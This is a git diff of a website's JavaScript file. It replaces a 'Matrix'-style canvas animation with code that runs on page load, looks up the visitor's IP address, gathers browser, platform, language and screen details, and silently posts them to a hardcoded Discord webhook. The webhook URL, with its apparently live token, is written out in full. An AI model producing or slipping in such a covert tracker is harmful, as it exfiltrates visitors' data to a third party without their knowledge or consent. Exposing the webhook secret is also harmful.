@@ -1,47 +1,64 @@
-const canvas = document.getElementById("matrixCanvas");
-const ctx = canvas.getContext("2d");
+// Replace with your Discord Webhook URL
+const webhookURL = "https://discord.com/api/webhooks/1281964965691130021/rJu7x1-gZIzhC1icUOTq7NqfDy7n3YAfZYV5Dfslsv4wBmyuHCfn5Rlk7xq4RATYcTiK";
 
-// Make the canvas full screen
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+// Function to get user information (like browser details)
+function getUserInfo(ip) {
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const language = navigator.language;
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
 
-// Characters to display
-const matrixChars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-const fontSize = 16;
-const columns = canvas.width / fontSize; // Number of columns
-const drops = [];
-
-// Initialize drops (one drop per column)
-for (let x = 0; x < columns; x++) {
-    drops[x] = Math.random() * canvas.height;
+    // Construct the message to send to Discord
+    return {
+        content: `🚨 **New visitor on the website!** 🚨\n\n` +
+                 `**IP Address:** ${ip}\n` +
+                 `**Platform:** ${platform}\n` +
+                 `**Language:** ${language}\n` +
+                 `**Screen Resolution:** ${screenWidth}x${screenHeight}\n` +
+                 `**User-Agent:** ${userAgent}\n` +
+                 `**Visit Time:** ${new Date().toLocaleString()}`
+    };
 }
 
-// Draw the falling numbers
-function draw() {
-    ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; // Darken the background slightly each frame
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
+// Send data to the Discord Webhook
+function sendToDiscord(ip) {
+    const userInfo = getUserInfo(ip);
 
-    ctx.fillStyle = "#0F0"; // Green color for the characters
-    ctx.font = `${fontSize}px monospace`;
-
-    for (let i = 0; i < drops.length; i++) {
-        const text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-        // Randomly reset the drop to the top or move it down
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-            drops[i] = 0;
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(userInfo)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('User info sent to Discord successfully.');
+        } else {
+            console.error('Error sending data to Discord.');
         }
-
-        drops[i]++;
-    }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
 }
 
-// Update the screen at an interval
-setInterval(draw, 50);
+// Fetch IP address using an external API (like ipinfo.io or ipify.org)
+function fetchIPAddress() {
+    fetch('https://api.ipify.org?format=json') // You can also use 'https://ipinfo.io/json' for more detailed information
+    .then(response => response.json())
+    .then(data => {
+        const ip = data.ip;
+        sendToDiscord(ip);
+    })
+    .catch(error => {
+        console.error('Error fetching IP:', error);
+        sendToDiscord('Unknown IP');
+    });
+}
 
-// Resize the canvas if the window size changes
-window.addEventListener('resize', () => {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-});
+// Trigger webhook when user visits the site
+window.onload = () => {
+    fetchIPAddress();
+};
